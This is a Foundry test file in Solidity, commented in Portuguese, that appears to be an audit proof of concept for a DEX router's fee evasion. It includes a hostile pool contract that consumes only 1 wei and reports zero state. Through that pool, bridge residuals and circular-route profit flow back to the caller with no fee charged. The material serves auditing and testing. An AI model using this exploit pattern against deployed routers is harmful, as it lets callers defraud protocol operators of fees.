// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.36;

// F1 — O VALOR SAI COMO RESIDUAL DE PONTE, E O RESIDUAL NAO PAGA FEE.
//
// A PERGUNTA DO DONO: "garante que ninguem pode escapar ao fee que pusemos."
//
// A fee de 28 bps e cobrada sobre `totalReceived`, e o `totalReceived` e SO o delta de saldo do
// `tokenOut`. Mas uma rota multi-hop tambem devolve ao chamador os RESIDUAIS das pontes — e essa
// devolucao nao tem limite nenhum e nao paga fee:
//
//     if (rb > bb) BPC.safeTransfer(bridge, payer, rb - bb);     // sem cap, sem fee
//     ...
//     uint256 totalReceived = BPC.balanceOf(tokenOut, address(this)) - toutStart;
//
// O comentario do proprio sweep ASSUME que os residuais sao po — "mulDiv rounding, partial-fill,
// ou uma pool nao-conforme que recusou o que lhe foi entregue". Nada o impoe.
//
// O MECANISMO QUE O TORNA EXPLORAVEL esta no callback do V3, e esta escrito por extenso:
// "Pay exactly what the pool demands" — o `owed` vem da POOL, limitado apenas por `maxAmt`. Uma
// pool que peca 1 wei recebe 1 wei. O resto da ponte fica no Router e e varrido para o pagador.
//
// A ROTA DO ATAQUE: A -> B (real, funda) -> C (po, pool do atacante).
//   1. O hop 0 executa a serio: o Router fica com quase todo o B.
//   2. O hop 1 aponta a uma pool que reporta estado ZERO (logo legQuote = 0) e a perna traz
//      expectedOut = 0. Isso desliga TODOS os pisos de uma vez, e cada um por uma razao propria:
//        · o portao por perna nao corre (guard exige uma das duas atestacoes);
//        · a Camada 1 nao corre (hopAttested == 0);
//        · o piso da rota e mulDiv(finalHopQuote=0, ...) = 0.
//      Nenhum deles esta partido. Todos sao RELATIVOS A QUOTE, e uma quote zero torna-os inertes.
//   3. A pool pede 1 wei de B e entrega po de C.
//   4. O sweep devolve B - 1wei ao pagador. SEM FEE.
//   5. `totalReceived` = po de C. A fee e 28 bps de po.
//
// PORQUE E QUE NENHUMA DAS DEFESAS DESTA SESSAO APANHA ISTO: o portao de cobertura e o A1 fecharam
// o canal "valor disfarcado de EXCEDENTE do tokenOut". Este e o canal SIMETRICO — "valor disfarcado
// de RESIDUAL de ponte" — e nunca foi tocado. E a assinatura de defeito da casa: um fix aplicado a
// UM de dois canais simetricos, pela decima-terceira vez.
//
// E o invariante que faltava e nomeavel: NENHUM teste ata a fee ao VALOR MOVIDO. O
// `invariant_FeeNeverExceedsProtocolMax` limita a fee POR CIMA. Ninguem a limita por BAIXO.

import {Test} from "forge-std/Test.sol";
import {BlazePhoenixRouter} from "../src/BlazePhoenixRouter.sol";
import {BlazePhoenixHub} from "../src/BlazePhoenixHub.sol";
import {BlazePhoenixCore as BPC, Route, Hop, Leg} from "../src/BlazePhoenixCore.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockV2Pair} from "./mocks/MockV2Pair.sol";

interface IERC20MinR {
    function transfer(address to, uint256 amt) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @notice Pool com forma de V3 que SUB-CONSOME: pede 1 wei do input e entrega po do output.
///         Reporta estado zero para que a quote in-frame do Router seja 0 e os pisos fiquem inertes.
contract UnderConsumingV3Pool {
    address public token0;
    address public token1;
    address public dustToken;
    uint256 public dust = 1;
    uint256 public demand = 1;

    constructor(address a, address b, address _dust) {
        (token0, token1) = a < b ? (a, b) : (b, a);
        dustToken = _dust;
    }

    // Estado ZERO: e isto que torna todos os pisos inertes de uma so vez.
    function slot0() external pure returns (uint160, int24, uint16, uint16, uint16, uint8, bool) {
        return (0, 0, 0, 0, 0, 0, false);
    }
    function liquidity() external pure returns (uint128) { return 0; }
    function fee() external pure returns (uint24) { return 3000; }

    function swap(address recipient, bool zeroForOne, int256, uint160, bytes calldata data)
        external returns (int256 a0, int256 a1)
    {
        IERC20MinR(dustToken).transfer(recipient, dust);
        (a0, a1) = zeroForOne
            ? (int256(demand), -int256(dust))
            : (-int256(dust), int256(demand));
        (bool ok, ) = recipient.call(
            abi.encodeWithSignature("uniswapV3SwapCallback(int256,int256,bytes)", a0, a1, data)
        );
        require(ok, "callback falhou");
    }
}

contract FeeEscapeViaBridgeResidualTest is Test {
    BlazePhoenixHub hub;
    BlazePhoenixRouter router;
    MockERC20 tA;   // input
    MockERC20 tB;   // a PONTE — e o token que realmente se move
    MockERC20 tC;   // o tokenOut de fachada
    MockV2Pair pairAB;
    UnderConsumingV3Pool poolBC;

    address user      = address(0x5E4);
    address treasury1 = address(0x7451);
    address treasury2 = address(0x7452);

    uint256 constant AMOUNT_IN = 1_000e18;

    function setUp() public {
        hub = new BlazePhoenixHub(address(this));
        tA = new MockERC20("A", "A");
        tB = new MockERC20("B", "B");
        tC = new MockERC20("C", "C");

        pairAB = new MockV2Pair(address(tA), address(tB));
        tA.mint(address(pairAB), 1_000_000e18);
        tB.mint(address(pairAB), 1_000_000e18);
        pairAB.setReserves(1_000_000e18, 1_000_000e18);

        poolBC = new UnderConsumingV3Pool(address(tB), address(tC), address(tC));
        tC.mint(address(poolBC), 1_000e18);

        router = new BlazePhoenixRouter(
            address(hub), address(0xBEEF), address(this), treasury1, treasury2
        );

        tA.mint(user, 10_000e18);
        vm.prank(user);
        tA.approve(address(router), type(uint256).max);
    }

    function _rotaDeFuga() private view returns (Route memory r) {
        uint256 qAB = (AMOUNT_IN * 9970 * 1_000_000e18) / (1_000_000e18 * 10_000 + AMOUNT_IN * 9970);

        Leg[] memory l0 = new Leg[](1);
        l0[0] = Leg({
            pool: address(pairAB), hooks: address(0), kind: BPC.KIND_V2, fee: 30,
            tickSpacing: 0, zeroForOne: address(tA) < address(tB),
            stable: false, amountIn: AMOUNT_IN, expectedOut: qAB, auxId: bytes32(0)
        });
        // A perna que desliga tudo: expectedOut = 0 e uma pool de estado zero.
        Leg[] memory l1 = new Leg[](1);
        l1[0] = Leg({
            pool: address(poolBC), hooks: address(0), kind: BPC.KIND_V3, fee: 3000,
            tickSpacing: 60, zeroForOne: address(tB) < address(tC),
            stable: false, amountIn: qAB, expectedOut: 0, auxId: bytes32(0)
        });

        Hop[] memory hops = new Hop[](2);
        hops[0] = Hop({tokenIn: address(tA), tokenOut: address(tB), amountIn: AMOUNT_IN, expectedOut: qAB, legs: l0});
        hops[1] = Hop({tokenIn: address(tB), tokenOut: address(tC), amountIn: qAB, expectedOut: 0, legs: l1});

        r = Route({
            hops: hops, totalOut: 0, singleOut: 0, singleOutFloor: 0,
            expectedImpactBps: 0, confidenceWad: 0, estGas: 0,
            hasSurplus: false, isV4Bundle: false
        });
    }

    /// A PROVA. Se isto passar, a fee e evitavel por qualquer pessoa, sempre.
    function test_ValorSaiComoResidualDePonteSemPagarFee() public {
        uint256 bUserAntes = tB.balanceOf(user);

        vm.prank(user);
        router.swapExactIn(_rotaDeFuga(), AMOUNT_IN, 1, user, block.timestamp + 1);

        uint256 bRecebido = tB.balanceOf(user) - bUserAntes;
        uint256 feeEmB    = tB.balanceOf(treasury1) + tB.balanceOf(treasury2);
        uint256 feeEmC    = tC.balanceOf(treasury1) + tC.balanceOf(treasury2);

        emit log_named_decimal_uint("B que o utilizador levou (o valor real)", bRecebido, 18);
        emit log_named_decimal_uint("fee cobrada em B                       ", feeEmB, 18);
        emit log_named_uint       ("fee cobrada em C (o tokenOut de fachada)", feeEmC);

        // O valor moveu-se mesmo: ~997 B numa pool de 1M contra um input de 1000 A.
        assertGt(bRecebido, 900e18, "o valor tem de ter mesmo passado pela ponte");

        // E A FEE NAO O SEGUIU.
        assertEq(feeEmB, 0, "a tesouraria nao recebeu nada do token que realmente se moveu");

        // 28 bps de ~997 B seriam ~2,79 B. O que se cobrou e po.
        uint256 devida = (bRecebido * 28) / 10_000;
        emit log_named_decimal_uint("fee que seria devida sobre o valor movido", devida, 18);
        assertLt(feeEmC, 1e6, "a fee cobrada e po, e nao 28 bps do valor movido");
    }

    /// O INVARIANTE QUE FALTA, escrito por extenso. Nenhum teste do repositorio ata a fee ao VALOR
    /// MOVIDO — o invariant_FeeNeverExceedsProtocolMax limita a fee por CIMA, e ninguem a limita
    /// por BAIXO. Este e o teste que essa invariante teria, e HOJE FALHA.
    function test_FeeAtadaAoValorMovido() public {
        uint256 antes = tB.balanceOf(user);
        vm.prank(user);
        router.swapExactIn(_rotaDeFuga(), AMOUNT_IN, 1, user, block.timestamp + 1);

        uint256 movido = tB.balanceOf(user) - antes;                 // valor extraido pela ponte
        uint256 cobrado = tB.balanceOf(treasury1) + tB.balanceOf(treasury2);
        uint256 minima = (movido * 28) / 10_000;

        assertGe(cobrado, minima,
            "INVARIANTE: a fee tem de ser >= 28 bps de TODO o valor que o chamador extrai, nao so do tokenOut");
    }

    // ─────────────────────────────────────────────────────────────────────────────────────────
    //  O SEGUNDO CANAL. Nao e "so os residuais de ponte": ha TRES saidas de valor para o
    //  chamador no _execute e a fee toca numa. Este e o canal do `tokenIn`, que tem exatamente a
    //  mesma forma — sem cap, sem fee:
    //
    //      if (residIn > baseIn) BPC.safeTransfer(tokenIn, payer, residIn - baseIn);
    //
    //  Devolver tokenIn nao gasto e um REEMBOLSO, nao uma extraccao — a menos que a rota PRODUZA
    //  tokenIn. Uma rota circular fa-lo: A -> B -> A. O lucro da arbitragem aterra no saldo de
    //  tokenIn do Router e sai por esta linha, intocado.
    //
    //  E repara porque o caso degenerado nao salva: o sweep so e saltado quando
    //  `tokenIn == tokenOut`. Basta declarar um terceiro token como tokenOut para o hop circular
    //  ficar no meio da rota e o lucro sair como residual.
    // ─────────────────────────────────────────────────────────────────────────────────────────
    function test_LucroCircularSaiComoResidualDeTokenIn() public {
        // Pool de volta B->A, funda.
        MockV2Pair pairBA = new MockV2Pair(address(tB), address(tA));
        tA.mint(address(pairBA), 1_000_000e18);
        tB.mint(address(pairBA), 1_000_000e18);
        pairBA.setReserves(uint112(1_000_000e18), uint112(1_000_000e18));
        // Pool de fachada A->C que sub-consome (1 wei) — o hop 3 tem de partir de A por
        // causa da CONTINUIDADE imposta em Router:784.
        UnderConsumingV3Pool poolAC = new UnderConsumingV3Pool(address(tA), address(tC), address(tC));
        tC.mint(address(poolAC), 1_000e18);

        uint256 qAB = (AMOUNT_IN * 9970 * 1_000_000e18) / (1_000_000e18 * 10_000 + AMOUNT_IN * 9970);
        uint256 qBA = (qAB * 9970 * 1_000_000e18) / (1_000_000e18 * 10_000 + qAB * 9970);

        Leg[] memory l0 = new Leg[](1);
        l0[0] = Leg({pool: address(pairAB), hooks: address(0), kind: BPC.KIND_V2, fee: 30,
            tickSpacing: 0, zeroForOne: address(tA) < address(tB), stable: false,
            amountIn: AMOUNT_IN, expectedOut: qAB, auxId: bytes32(0)});
        Leg[] memory l1 = new Leg[](1);
        l1[0] = Leg({pool: address(pairBA), hooks: address(0), kind: BPC.KIND_V2, fee: 30,
            tickSpacing: 0, zeroForOne: address(tB) < address(tA), stable: false,
            amountIn: qAB, expectedOut: qBA, auxId: bytes32(0)});
        Leg[] memory l2 = new Leg[](1);
        l2[0] = Leg({pool: address(poolAC), hooks: address(0), kind: BPC.KIND_V3, fee: 3000,
            tickSpacing: 60, zeroForOne: address(tA) < address(tC), stable: false,
            amountIn: qBA, expectedOut: 0, auxId: bytes32(0)});

        Hop[] memory hops = new Hop[](3);
        hops[0] = Hop({tokenIn: address(tA), tokenOut: address(tB), amountIn: AMOUNT_IN, expectedOut: qAB, legs: l0});
        hops[1] = Hop({tokenIn: address(tB), tokenOut: address(tA), amountIn: qAB, expectedOut: qBA, legs: l1});
        hops[2] = Hop({tokenIn: address(tA), tokenOut: address(tC), amountIn: qBA, expectedOut: 0, legs: l2});

        Route memory r = Route({hops: hops, totalOut: 0, singleOut: 0, singleOutFloor: 0,
            expectedImpactBps: 0, confidenceWad: 0, estGas: 0, hasSurplus: false, isV4Bundle: false});

        uint256 aAntes = tA.balanceOf(user);
        vm.prank(user);
        router.swapExactIn(r, AMOUNT_IN, 1, user, block.timestamp + 1);

        uint256 aDepois = tA.balanceOf(user);
        uint256 devolvido = aDepois + AMOUNT_IN - aAntes;
        uint256 feeEmA = tA.balanceOf(treasury1) + tA.balanceOf(treasury2);
        emit log_named_decimal_uint("A devolvido pelo sweep de tokenIn", devolvido, 18);
        emit log_named_decimal_uint("fee cobrada em A                 ", feeEmA, 18);

        assertGt(devolvido, 900e18, "o valor voltou mesmo pelo canal do tokenIn");
        assertEq(feeEmA, 0, "SEGUNDO CANAL: o sweep de tokenIn tambem nao paga fee");
    }
}
